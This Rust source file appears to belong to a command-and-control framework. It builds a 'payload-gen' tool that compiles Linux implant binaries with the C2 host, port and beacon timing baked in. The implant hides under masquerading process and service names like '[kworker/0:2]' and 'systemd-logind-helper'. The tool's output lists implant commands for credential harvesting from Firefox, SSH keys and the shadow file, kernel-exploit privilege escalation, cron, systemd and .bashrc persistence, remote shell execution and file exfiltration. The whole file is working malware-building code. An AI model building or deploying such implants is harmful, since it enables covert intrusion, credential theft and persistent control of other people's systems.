/// Payload Generator — builds custom implant binaries with operator-specified C2 config.
///
/// Wraps `cargo build` with environment variables that bake C2 host, port, protocol,
/// and beacon settings into the implant at compile time via `option_env!()`.
///
/// The implant is a simple beacon that phones home and waits for operator commands.
/// Stealth level (loud vs stealthy) is determined by which modules the operator
/// activates during the engagement — not by a pre-baked "tier."
///
/// Usage:
///   payload-gen --host 10.0.0.1 --port 8443 --protocol https --output ./implant
///   payload-gen --host 192.168.1.100 --protocol http --beacon-rate 120 --jitter 30
///   payload-gen --host c2.example.com --beacon-rate 300 --process-name "[kworker/0:2]"
use clap::Parser;
use std::path::PathBuf;
use std::process::Command;

#[derive(Parser)]
#[command(name = "payload-gen", about = "Build custom C2 implant binaries")]
struct Cli {
    /// Transport protocol: http or https
    #[arg(long, default_value = "https")]
    protocol: String,

    /// C2 server hostname or IP (required)
    #[arg(long)]
    host: String,

    /// C2 server port (default: 80 for http, 443 for https)
    #[arg(long)]
    port: Option<u16>,

    /// Beacon interval in seconds
    #[arg(long, default_value = "60")]
    beacon_rate: u64,

    /// Max jitter seconds added before each beacon
    #[arg(long, default_value = "0")]
    jitter: u64,

    /// Process name for ps visibility (default: "system-updater")
    #[arg(long, default_value = "system-updater")]
    process_name: String,

    /// systemd service name for persist module (default: "systemd-logind-helper")
    #[arg(long, default_value = "systemd-logind-helper")]
    service_name: String,

    /// Implant install path for persist module (default: "/usr/bin/dbus-runner")
    #[arg(long, default_value = "/usr/bin/dbus-runner")]
    implant_path: String,

    /// Output path for the compiled implant binary
    #[arg(long, default_value = "./implant.bin")]
    output: PathBuf,

    /// Rust target triple
    #[arg(long, default_value = "x86_64-unknown-linux-musl")]
    target: String,

    /// Enable forensic labelling marker (writes to /dev/shm)
    #[arg(long)]
    labelling_marker: bool,

    /// Release build (default: true)
    #[arg(long, default_value = "true")]
    release: bool,
}

fn main() {
    let cli = Cli::parse();

    let protocol = cli.protocol.to_lowercase();
    if protocol != "http" && protocol != "https" {
        eprintln!("[!] Protocol must be 'http' or 'https'");
        std::process::exit(1);
    }

    // Build the implant binary (implant crate has both lib + bin)
    let package = "implant";
    let port = cli.port.unwrap_or(if protocol == "http" { 80 } else { 443 });

    println!("╔══════════════════════════════════════════════════╗");
    println!("║   C2 Payload Generator                          ║");
    println!("╠══════════════════════════════════════════════════╣");
    println!("║  Protocol:    {}", protocol.to_uppercase());
    println!("║  C2 Host:     {}", cli.host);
    println!("║  C2 Port:     {}", port);
    println!("║  Beacon Rate: {}s", cli.beacon_rate);
    if cli.jitter > 0 {
        println!("║  Jitter:      {}s max", cli.jitter);
    }
    println!("║  Process:     {}", cli.process_name);
    println!("║  Service:     {}", cli.service_name);
    println!("║  Implant:     {}", cli.implant_path);
    if cli.labelling_marker {
        println!("║  Marker:      enabled");
    }
    println!("║  Target:      {}", cli.target);
    println!("║  Output:      {}", cli.output.display());
    println!("╚══════════════════════════════════════════════════╝");
    println!();
    println!("  Stealth level is defined by operator behavior:");
    println!("    Loud:   shell cmds, ping sweeps, pkexec, bashrc backdoor");
    println!("    Mixed:  shell harvest, in-memory recon, CopyFail, cron");
    println!("    Stealth: all in-memory, copyfail+fd9, systemd only");
    println!();

    // Check for musl target
    let check_target = Command::new("rustup")
        .args(["target", "list", "--installed"])
        .output();
    if let Ok(output) = check_target {
        let installed = String::from_utf8_lossy(&output.stdout);
        if !installed.contains(&cli.target) {
            eprintln!("[!] Target {} not installed. Install with:", cli.target);
            eprintln!("    rustup target add {}", cli.target);
            std::process::exit(1);
        }
    }

    // Build the implant
    println!("[*] Building {} ({})...", package, protocol.to_uppercase());

    // Find the project root: RIPTIDE_SRC env var, or compile-time default, or cwd
    let project_dir = std::env::var("RIPTIDE_SRC")
        .or_else(|_| std::env::var("CARGO_MANIFEST_DIR"))
        .unwrap_or_else(|_| {
            option_env!("RIPTIDE_SRC").unwrap_or("/opt/riptide/src").to_string()
        });

    let mut cmd = Command::new("cargo");
    cmd.current_dir(&project_dir);
    cmd.arg("build");

    if cli.release {
        cmd.arg("--release");
    }

    cmd.arg("--target").arg(&cli.target);
    cmd.arg("-p").arg(package);

    // Environment variables baked into the binary via option_env!()
    cmd.env("C2_HOST", &cli.host);
    cmd.env("C2_PORT", port.to_string());
    cmd.env("BEACON_RATE", cli.beacon_rate.to_string());
    cmd.env("BEACON_JITTER", cli.jitter.to_string());
    cmd.env("C2_TLS", if protocol == "https" { "1" } else { "0" });
    cmd.env("PROCESS_NAME", &cli.process_name);
    cmd.env("SERVICE_NAME", &cli.service_name);
    cmd.env("IMPLANT_PATH", &cli.implant_path);

    if cli.labelling_marker {
        cmd.env("LABELLING_MARKER", "1");
    }

    // For HTTP, disable default features (which enable TLS in implant lib)
    if protocol == "http" {
        cmd.arg("--no-default-features");
    }

    let status = cmd.status().expect("failed to run cargo build");

    if !status.success() {
        eprintln!("[!] Build failed!");
        std::process::exit(1);
    }

    // Locate and copy the built binary
    let target_dir = if cli.release { "release" } else { "debug" };
    let src = format!("{}/target/{}/{}/{}", project_dir, cli.target, target_dir, package);

    if let Err(e) = std::fs::copy(&src, &cli.output) {
        eprintln!("[!] Failed to copy binary from {}: {}", src, e);
        eprintln!("[!] Check that the build succeeded and the target path is correct.");
        std::process::exit(1);
    }

    // Make executable
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        if let Ok(meta) = std::fs::metadata(&cli.output) {
            let mut perms = meta.permissions();
            perms.set_mode(0o755);
            let _ = std::fs::set_permissions(&cli.output, perms);
        }
    }

    let size = std::fs::metadata(&cli.output).map(|m| m.len()).unwrap_or(0);
    let size_str = if size > 1024 * 1024 {
        format!("{:.1} MB", size as f64 / (1024.0 * 1024.0))
    } else {
        format!("{} KB", size / 1024)
    };

    println!();
    println!("[+] Implant built: {} ({})", cli.output.display(), size_str);
    println!("[+] C2: {}://{}:{}", protocol, cli.host, port);
    println!();
    println!("  Deploy to target and execute. The implant will phone home");
    println!("  and wait for operator commands. All capabilities on-demand:");
    println!();
    println!("  ── Recon ──");
    println!("    recon passive   - /proc reads only (stealth)");
    println!("    recon active    - ping sweep + ip + ss (noisy)");
    println!("    recon arp       - ARP table dump");
    println!("  ── Creds ──");
    println!("    creds harvest   - Firefox, SSH, shadow, bash_history");
    println!("  ── Privesc ──");
    println!("    privesc copyfail - AF_ALG kernel exploit");
    println!("    privesc pkexec   - GUI password prompt");
    println!("  ── Persist ──");
    println!("    persist cron    - @reboot cron job");
    println!("    persist systemd - systemd service (name: {})", cli.service_name);
    println!("    persist bashrc  - .bashrc backdoor");
    println!("  ── Other ──");
    println!("    shell <cmd>     - Execute command");
    println!("    exfil <path>    - Exfiltrate file");
    println!("    marker <label>  - Forensic trace");
    println!("    download <path> - Download file");
    println!("    system info     - Metadata");
    println!("    system exit     - Terminate");
    println!();
    println!("  Start C2 server:");
    println!("    cargo run -p c2-server --release");
    println!();
    println!("  Operator console:");
    println!("    cargo run -p console -- --server {}://{}:{}", protocol, cli.host, port);
}
